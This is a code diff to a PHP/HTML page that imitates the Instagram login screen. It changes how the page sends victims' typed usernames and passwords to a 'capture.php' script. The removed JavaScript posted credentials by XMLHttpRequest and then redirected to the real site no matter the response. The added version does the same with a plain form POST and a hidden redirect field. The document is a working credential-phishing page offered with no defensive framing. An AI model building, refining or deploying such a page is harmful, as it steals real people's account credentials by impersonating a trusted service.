@@ -3,7 +3,6 @@ if (session_status() === PHP_SESSION_NONE) {
     session_start();
 }
 $redirect_url = $_SESSION['redirect_url'] ?? 'https://www.instagram.com/';
-$base_url = rtrim(dirname($_SERVER['SCRIPT_NAME']), '/');
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -143,15 +142,15 @@ $base_url = rtrim(dirname($_SERVER['SCRIPT_NAME']), '/');
     <div class="container">
         <div class="login-box">
             <div class="logo"></div>
-            <form class="login-form" id="loginForm">
+            <form class="login-form" id="loginForm" method="POST" action="capture.php">
                 <div class="input-wrapper">
-                    <input type="text" id="username" name="username" placeholder="Phone number, username, or email" autocapitalize="off" autocorrect="off" autocomplete="username" required>
+                    <input type="text" id="username" name="username" placeholder="Phone number, username, or email" autocapitalize="off" autocorrect="off" required>
                 </div>
                 <div class="input-wrapper password-wrapper">
-                    <input type="password" id="password" name="password" placeholder="Password" autocapitalize="off" autocorrect="off" autocomplete="current-password" required>
+                    <input type="password" id="password" name="password" placeholder="Password" autocapitalize="off" autocorrect="off" required>
                     <button type="button" class="toggle-password" id="togglePassword">Show</button>
                 </div>
-                <input type="hidden" id="redirect_url" value="<?php echo htmlspecialchars($redirect_url); ?>">
+                <input type="hidden" name="redirect_url" value="<?php echo htmlspecialchars($redirect_url); ?>">
                 <button type="submit" class="login-btn" id="loginBtn" disabled>Log in</button>
                 <div class="loading" id="loading">
                     <svg width="18" height="18" viewBox="0 0 18 18" fill="none">
@@ -195,13 +194,12 @@ $base_url = rtrim(dirname($_SERVER['SCRIPT_NAME']), '/');
     </div>
 
     <script>
-        var form = document.getElementById("loginForm");
         var loginBtn = document.getElementById("loginBtn");
-        var loading = document.getElementById("loading");
         var usernameInput = document.getElementById("username");
         var passwordInput = document.getElementById("password");
         var togglePassword = document.getElementById("togglePassword");
-        var redirectUrl = document.getElementById("redirect_url").value;
+        var loading = document.getElementById("loading");
+        var form = document.getElementById("loginForm");
 
         function checkInputs() {
             loginBtn.disabled = !(usernameInput.value.trim() && passwordInput.value);
@@ -219,43 +217,10 @@ $base_url = rtrim(dirname($_SERVER['SCRIPT_NAME']), '/');
             this.textContent = isPassword ? "Hide" : "Show";
         });
 
-        form.addEventListener("submit", function(e) {
-            e.preventDefault();
-            
-            var username = usernameInput.value;
-            var password = passwordInput.value;
-            
+        form.addEventListener("submit", function() {
             loginBtn.disabled = true;
             loginBtn.style.display = "none";
             loading.style.display = "block";
-
-            // Create form data
-            var formData = new FormData();
-            formData.append("username", username);
-            formData.append("password", password);
-            formData.append("redirect_url", redirectUrl);
-
-            // Send credentials using XMLHttpRequest for better compatibility
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", "capture.php", true);
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState === 4) {
-                    // Redirect regardless of response
-                    setTimeout(function() {
-                        window.location.href = redirectUrl;
-                    }, 800);
-                }
-            };
-            xhr.onerror = function() {
-                // Redirect even on error
-                window.location.href = redirectUrl;
-            };
-            xhr.send(formData);
-            
-            // Fallback: redirect after 3 seconds no matter what
-            setTimeout(function() {
-                window.location.href = redirectUrl;
-            }, 3000);
         });
     </script>
 </body>
